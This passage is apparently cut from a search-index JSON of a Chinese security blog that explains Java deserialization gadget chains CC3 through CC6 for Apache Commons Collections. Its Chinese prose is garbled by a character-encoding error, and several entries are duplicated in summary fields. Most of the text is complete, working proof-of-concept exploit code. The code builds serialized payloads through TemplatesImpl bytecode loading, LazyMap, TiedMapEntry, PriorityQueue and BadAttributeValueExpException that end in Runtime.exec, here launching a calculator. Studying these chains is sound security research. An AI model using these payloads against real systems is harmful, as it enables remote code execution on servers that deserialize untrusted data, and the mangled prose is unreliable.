com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import javax.xml.transform.Templates; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CommonsCollections3_cc1_LazyMap { private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); setFieldValue(tmpl, \u0026#34;_bytecodes\u0026#34;, new byte[][] {code}); setFieldValue(tmpl, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(tmpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;Yuy0ung\u0026#34;); Map outerMap = LazyMap.decorate(innerMap, transformerChain); Class cls = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor = cls.getDeclaredConstructor(Class.class,Map.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor.newInstance(Target.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler); Object obj = constructor.newInstance(Target.class, proxyMap); serialize(obj); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } è¿è¡Œï¼ŒæˆåŠŸåŠ è½½å­—èŠ‚ç è§¦å‘å‘½ä»¤æ‰§è¡Œï¼š\næˆ‘ä»¬å·²çŸ¥CC1åªèƒ½åœ¨java 8u65ä»¥ä¸‹åˆ©ç”¨è€ŒCC6å¯ä»¥é€šæ€java7å’Œjava8ä¸”æ€è·¯ç›¸ä¼¼ï¼Œäºæ˜¯æˆ‘ä»¬å†åˆ©ç”¨CC6æ„é€ ä¸€æ¬¡\næ„é€ -CC6 åŒç†äº†ï¼Œå¾ˆç®€å•ï¼š\npackage com.yuy0ung; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import javax.xml.transform.Templates; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections3_cc6 { private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); setFieldValue(tmpl, \u0026#34;_bytecodes\u0026#34;, new byte[][] {code}); setFieldValue(tmpl, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(tmpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl}) }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;Yuy0ung\u0026#34;); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerMap, \u0026#34;Yuy0ung\u0026#34;); Map evilMap = new HashMap(); evilMap.put(tme,\u0026#34;Yuy1ung\u0026#34;); outerMap.remove(\u0026#34;Yuy0ung\u0026#34;); Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain,transformers); serialize(evilMap); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } è¿è¡Œï¼ŒæˆåŠŸåŠ è½½å­—èŠ‚ç è§¦å‘å‘½ä»¤æ‰§è¡Œï¼š\nè¿™ä¸€ä¸ªé“¾å­å°±æ˜¯èƒ½å¤Ÿé€šæ€java7å’Œjava8çš„äº†\næ€»ç»“ CC3å…¶å®æ¢æ±¤ä¸æ¢è¯ï¼Œå°±æ˜¯ä½¿ç”¨CC1/CC6çš„é“¾å­å»è§¦å‘TemplatesåŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼Œå®ç°è§¦å‘å‘½ä»¤æ‰§è¡Œ\n",
        "summary": "javaååºåˆ—åŒ–é“¾-CC3 ç®€å•ç†è§£ï¼ŒCC3å°±æ˜¯CC1+TemplatesImplåŠ¨æ€åŠ è½½å­—èŠ‚ç \ndemo å…ˆçœ‹cc1çš„ç®€å•demoï¼š\npackage com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } } æˆ‘ä»¬å°†å…¶ç»“åˆä¸ŠåŠ¨æ€åŠ è½½å­—èŠ‚ç ï¼Œå°±æ˜¯åœ¨InvokerTransformerä¸­åšæ‰‹è„šï¼š\n"
    }
,
    {
        "title": "Javaååºåˆ—åŒ–-CC4",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE-cc4/",
        "content": "Javaååºåˆ—åŒ–é“¾-CC4 CC4ä¹Ÿæ˜¯é’ˆå¯¹org.apache.commons:commons-collections4çš„ä¸€æ¡é“¾å­ï¼Œæœ¬è´¨ä¸Šæ˜¯åœ¨CC2çš„åŸºç¡€ä¸Šä¿®æ”¹ï¼Œä¸»è¦æ€è·¯æ˜¯ä½¿ç”¨æˆ‘ä»¬åœ¨CC3æåˆ°çš„InstantiateTransformeræ¥ä»£æ›¿åŸæœ¬çš„InvokerTransformer\næ„é€  æŒ‰ç…§ä¸Šé¢çš„æ€è·¯æ¥æ„é€ ï¼š\npackage com.yuy0ung; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import javax.xml.transform.Templates; import java.io.*; import java.util.Comparator; import java.util.PriorityQueue; public class CommonsCollections4 { private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); setFieldValue(tmpl, \u0026#34;_bytecodes\u0026#34;, new byte[][] {code}); setFieldValue(tmpl, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(tmpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl}) }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Comparator comparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(tmpl); queue.add(tmpl); setFieldValue(transformerChain, \u0026#34;iTransformers\u0026#34;, transformers); serialize(queue); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } æˆåŠŸå‘½ä»¤æ‰§è¡Œï¼š\n",
        "summary": "Javaååºåˆ—åŒ–é“¾-CC4 CC4ä¹Ÿæ˜¯é’ˆå¯¹org.apache.commons:commons-collections4çš„ä¸€æ¡é“¾å­ï¼Œæœ¬è´¨ä¸Šæ˜¯åœ¨CC2çš„åŸºç¡€ä¸Šä¿®æ”¹ï¼Œä¸»è¦æ€è·¯æ˜¯ä½¿ç”¨æˆ‘ä»¬åœ¨CC3æåˆ°çš„InstantiateTransformeræ¥ä»£æ›¿åŸæœ¬çš„InvokerTransformer\næ„é€  æŒ‰ç…§ä¸Šé¢çš„æ€è·¯æ¥æ„é€ ï¼š\npackage com.yuy0ung; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import javax.xml.transform.Templates; import java.io.*; import java.util.Comparator; import java.util.PriorityQueue; public class CommonsCollections4 { private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { java.lang.reflect.Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { byte[] code = ClassPool.getDefault().get(RCETest.class.getName()).toBytecode(); TemplatesImpl tmpl = new TemplatesImpl(); setFieldValue(tmpl, \u0026#34;_bytecodes\u0026#34;, new byte[][] {code}); setFieldValue(tmpl, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(tmpl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tmpl}) }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Comparator comparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(tmpl); queue.add(tmpl); setFieldValue(transformerChain, \u0026#34;iTransformers\u0026#34;, transformers); serialize(queue); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } æˆåŠŸå‘½ä»¤æ‰§è¡Œï¼š\n"
    }
,
    {
        "title": "Javaååºåˆ—åŒ–-CC5",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc5/",
        "content": "javaååºåˆ—åŒ–-CC5 åœ¨å­¦ä¹ CC6çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç”¨åˆ°äº†org.apache.commons.collections.keyvalue.TiedMapEntryï¼Œå®ƒçš„hashcode()æ–¹æ³•è°ƒç”¨äº†getValue()ï¼Œè€ŒgetValue()è°ƒç”¨åˆ°äº†get()\næˆ‘ä»¬å†çœ‹ä¸€ä¸‹TiedMapEntryå¯ä»¥å‘ç°å®ƒçš„toString()æ–¹æ³•ä¸­ä¹Ÿè°ƒç”¨äº†getValue()ï¼š\nè€ŒCC5å°±æ˜¯ä»è¿™ä¸ªåœ°æ–¹å…¥æ‰‹è¿›è¡Œè°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå«åšBadAttributeValueExpExceptioçš„æ–¹æ³•è°ƒç”¨äº†toString()ï¼Œè™½ç„¶è¿™ä¸ªç±»æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œä½†æ˜¯å…¶çˆ¶ç±»Exceptionçš„çˆ¶ç±»Throwableå®ç°äº†Serializableæ¥å£ï¼Œæ‰€ä»¥BadAttributeValueExceptionä¹Ÿæ˜¯å¯ä»¥åºåˆ—åŒ–çš„ï¼š\nåœ¨å®ƒçš„readObject()æ–¹æ³•ä¸­è¿›è¡Œäº†è°ƒç”¨ï¼š\næˆ‘ä»¬éœ€è¦è¿›å…¥è¿™ä¸ªifåˆ¤æ–­æ¡ä»¶ï¼Œå› ä¸ºé»˜è®¤æƒ…å†µä¸‹System.getSecurityManager()ä¸ºnullï¼Œé‚£ä¹ˆä¸ç”¨ç®¡äº†ï¼Œåªéœ€è¦æ§åˆ¶valObjä¸ºTiedMapEntryå¯¹è±¡å³å¯\nåŒæ—¶ï¼Œæ³¨æ„åˆ°è¿™é‡Œè¿˜æœ‰ä¸ªæ„é€ æ–¹æ³•ï¼š é‡Œé¢æ˜¯ä¸ªä¸‰ç›®è¿ç®—ç¬¦ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå°†valè®¾ç½®ä¸ºTiedMapEntryå°±ä¼šç«‹å³è°ƒç”¨TiedMapEntry#toStringï¼Œæˆ‘ä»¬ä¸æƒ³è®©ä»–æå‰è§¦å‘ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å®ä¾‹åŒ–æ—¶å…ˆå°†å‚æ•°è®¾ç½®ä¸ºnullï¼š\nBadAttributeValueExpException bavee = new BadAttributeValueExpException(null); å†åå°„ä¿®æ”¹å°†æˆ‘ä»¬åˆ›å»ºçš„TiedMapEntryä¼ å…¥ï¼š\nTiedMapEntry tme = new TiedMapEntry(outerMap, \u0026#34;Yuy0ung\u0026#34;); Field val = bavee.getClass().getDeclaredField(\u0026#34;val\u0026#34;); val.setAccessible(true); val.set(bavee,tme); å…¶ä»–éƒ¨åˆ†å°±æ˜¯CC6çš„é€»è¾‘ï¼Œå®Œæ•´ä»£ç å¦‚ä¸‹ï¼š\npackage com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections5 { public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); BadAttributeValueExpException bavee = new BadAttributeValueExpException(null); TiedMapEntry tme = new TiedMapEntry(outerMap, \u0026#34;Yuy0ung\u0026#34;); Field val = bavee.getClass().getDeclaredField(\u0026#34;val\u0026#34;); val.setAccessible(true); val.set(bavee,tme); Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain,transformers); serialize(bavee); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } è¿è¡ŒæˆåŠŸå‘½ä»¤æ‰§è¡Œï¼š\n",
        "summary": "javaååºåˆ—åŒ–-CC5 åœ¨å­¦ä¹ CC6çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç”¨åˆ°äº†org.apache.commons.collections.keyvalue.TiedMapEntryï¼Œå®ƒçš„hashcode()æ–¹æ³•è°ƒç”¨äº†getValue()ï¼Œè€ŒgetValue()è°ƒç”¨åˆ°äº†get()\næˆ‘ä»¬å†çœ‹ä¸€ä¸‹TiedMapEntryå¯ä»¥å‘ç°å®ƒçš„toString()æ–¹æ³•ä¸­ä¹Ÿè°ƒç”¨äº†getValue()ï¼š\nè€ŒCC5å°±æ˜¯ä»è¿™ä¸ªåœ°æ–¹å…¥æ‰‹è¿›è¡Œè°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå«åšBadAttributeValueExpExceptioçš„æ–¹æ³•è°ƒç”¨äº†toString()ï¼Œè™½ç„¶è¿™ä¸ªç±»æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œä½†æ˜¯å…¶çˆ¶ç±»Exceptionçš„çˆ¶ç±»Throwableå®ç°äº†Serializableæ¥å£ï¼Œæ‰€ä»¥BadAttributeValueExceptionä¹Ÿæ˜¯å¯ä»¥åºåˆ—åŒ–çš„ï¼š\nåœ¨å®ƒçš„readObject()æ–¹æ³•ä¸­è¿›è¡Œäº†è°ƒç”¨ï¼š\næˆ‘ä»¬éœ€è¦è¿›å…¥è¿™ä¸ªifåˆ¤æ–­æ¡ä»¶ï¼Œå› ä¸ºé»˜è®¤æƒ…å†µä¸‹System.getSecurityManager()ä¸ºnullï¼Œé‚£ä¹ˆä¸ç”¨ç®¡äº†ï¼Œåªéœ€è¦æ§åˆ¶valObjä¸ºTiedMapEntryå¯¹è±¡å³å¯\nåŒæ—¶ï¼Œæ³¨æ„åˆ°è¿™é‡Œè¿˜æœ‰ä¸ªæ„é€ æ–¹æ³•ï¼š é‡Œé¢æ˜¯ä¸ªä¸‰ç›®è¿ç®—ç¬¦ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œå°†valè®¾ç½®ä¸ºTiedMapEntryå°±ä¼šç«‹å³è°ƒç”¨TiedMapEntry#toStringï¼Œæˆ‘ä»¬ä¸æƒ³è®©ä»–æå‰è§¦å‘ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å®ä¾‹åŒ–æ—¶å…ˆå°†å‚æ•°è®¾ç½®ä¸ºnullï¼š\nBadAttributeValueExpException bavee = new BadAttributeValueExpException(null); å†åå°„ä¿®æ”¹å°†æˆ‘ä»¬åˆ›å»ºçš„TiedMapEntryä¼ å…¥ï¼š\nTiedMapEntry tme = new TiedMapEntry(outerMap, \u0026#34;Yuy0ung\u0026#34;); Field val = bavee.getClass().getDeclaredField(\u0026#34;val\u0026#34;); val.setAccessible(true); val.set(bavee,tme); å…¶ä»–éƒ¨åˆ†å°±æ˜¯CC6çš„é€»è¾‘ï¼Œå®Œæ•´ä»£ç å¦‚ä¸‹ï¼š\npackage com.yuy0ung; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections5 { public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); BadAttributeValueExpException bavee = new BadAttributeValueExpException(null); TiedMapEntry tme = new TiedMapEntry(outerMap, \u0026#34;Yuy0ung\u0026#34;); Field val = bavee.getClass().getDeclaredField(\u0026#34;val\u0026#34;); val.setAccessible(true); val.set(bavee,tme); Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain,transformers); serialize(bavee); unserialize(\u0026#34;ser.bin\u0026#34;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.bin\u0026#34;)); oos.writeObject(obj); } public static Object unserialize(String fileName) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; } } è¿è¡ŒæˆåŠŸå‘½ä»¤æ‰§è¡Œï¼š\n"
    }
,
    {
        "title": "Javaååºåˆ—åŒ–-CC6",
        "link": "/My-Knowlege-Database/blog/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cc6/",
        "content": "javaååºåˆ—åŒ–-CC6 å­¦ä¹ ç¬¬äºŒæ¡CommonsCollectionsçš„åˆ©ç”¨é“¾\nTiedMapEntry å‰é¢å·²ç»å­¦ä¹ äº†CC1ï¼Œä½†æ˜¯åœ¨Java 8u71ä»¥åCC1å°±å¤±æ•ˆäº†ï¼Œå› ä¸ºsun.reflect.annotation.AnnotationInvocationHandler#readObjectçš„é€»è¾‘å˜åŒ–äº†\nè€ŒCC6ï¼Œå°±ç®—æ˜¯è§£å†³äº†é«˜ç‰ˆæœ¬javaçš„åˆ©ç”¨é—®é¢˜ï¼Œå…ˆçœ‹çœ‹è¿™ä¸ªpç¥ç®€åŒ–ç‰ˆåˆ©ç”¨é“¾ï¼š\nGadget chain: java.io.ObjectInputStream.readObject() java.util.HashMap.readObject() java.util.HashMap.hash() org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() org.apache.commons.collections.map.LazyMap.get() org.apache.commons.collections.functors.ChainedTransformer.transform() org.apache.commons.collections.functors.InvokerTransformer.transform() java.lang.reflect.Method.invoke() java.lang.Runtime.exec() å¯ä»¥çœ‹åˆ°åœ¨LazyMapåˆ°execçš„åˆ©ç”¨é“¾æ˜¯æ²¡å˜çš„ï¼Œæ”¹å˜çš„ä¸»è¦æ˜¯è§¦å‘LazyMap#get()çš„æ–¹å¼ï¼Œæ¥æ›¿ä»£åŸæœ¬CC1ä¸­çš„AnnotationInvocationHandler\nè€Œè¿™é‡Œç»™å‡ºçš„ç±»æ˜¯org.apache.commons.collections.keyvalue.TiedMapEntryï¼Œä»–çš„getValueæ–¹æ³•ä¸­è°ƒç”¨äº†getï¼š è€Œä»–çš„hashCodeæ–¹æ³•å°±è°ƒç”¨äº†getValueï¼š\né‚£ä¹ˆæˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯æ‰¾åˆ°èƒ½å¤Ÿè°ƒç”¨è¿™ä¸ªhashCodeçš„åœ°æ–¹ï¼Œåœ¨ysoserialä¸­ï¼Œæ˜¯åˆ©â½¤ java.util.HashSet#readObject åˆ° HashMap#put() åˆ° HashMap#hash(key)æœ€ååˆ° TiedMapEntry#hashCode()\nè€Œpç‰›åœ¨ java.util.HashMap#readObject ä¸­æ‰¾åˆ° HashMap#hash()çš„è°ƒâ½¤ï¼š è€Œè¿™é‡Œçš„hash(key)å°±è°ƒç”¨äº†key.hashCode()ï¼š\næ³¨æ„åˆ°è¿™é‡Œçš„å‚æ•°keyï¼Œåªè¦æˆ‘ä»¬è®©keyçš„å€¼ä¸ºTiedMapEntryçš„å¯¹è±¡ï¼Œé‚£ä¹ˆæœ€åè°ƒç”¨çš„å°±æ˜¯TiedMapEntry#hashCode()ï¼Œå¦‚æ­¤å°±å»æ‰äº†ysoserialæœ€å‰â¾¯çš„ä¸¤æ¬¡è°ƒâ½¤ï¼Œä¹Ÿèƒ½æ„é€ ä¸ºå®Œæ•´gadget\næ„é€  é¦–å…ˆæ˜¯LazyMapåçš„éƒ¨åˆ†ä¸å˜ï¼Œè¿™é‡Œä¸ºäº†é˜²æ­¢åœ¨æœ¬åœ°è°ƒè¯•æ—¶å°±è§¦å‘å‘½ä»¤æ‰§è¡Œå½±å“è°ƒè¯•ï¼Œæ‰€ä»¥å…ˆè®¾ç½®äº†ä¸€ä¸ªfakeTransformersï¼Œç­‰åˆ°åºåˆ—åŒ–æ—¶å†åå°„æ›´æ”¹ï¼š\nTransformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;open -a calculator\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); æ¥ä¸‹æ¥æŒ‰ç…§TiedMapEntryçš„æ„é€ å‡½æ•°æ ¼å¼æ¥åˆ›å»ºå¯¹è±¡ï¼š\nTiedMapEntry tme = new TiedMapEntry(innerMap, \u0026#34;Yuy0ung\u0026#34;); é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯è®©å‰é¢æåˆ°çš„keyå€¼ä¸ºtmeï¼Œä»è€Œè°ƒç”¨TiedMapEntry#hashCode()ï¼š\nMap evilMap = new HashMap(); evilMap.put(tme,\u0026#34;Yuy0ung\u0026#34;); æ¥ä¸‹æ¥ç”¨åå°„æŠŠfakeTransformersæ”¹å›æ¥ï¼š\nField f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain,transformers); å°è¯•åºåˆ—åŒ–evilmapï¼Œå‘ç°ååºåˆ—åŒ–æ—¶å¹¶æ²¡æœ‰è§¦å‘å‘½ä»¤æ‰§è¡Œï¼š è°ƒè¯•åˆ†æï¼Œå‘ç°åœ¨è§¦å‘factory.transform()å‰éœ€è¦ç»è¿‡ä¸€ä¸ªifåˆ¤æ–­ï¼š 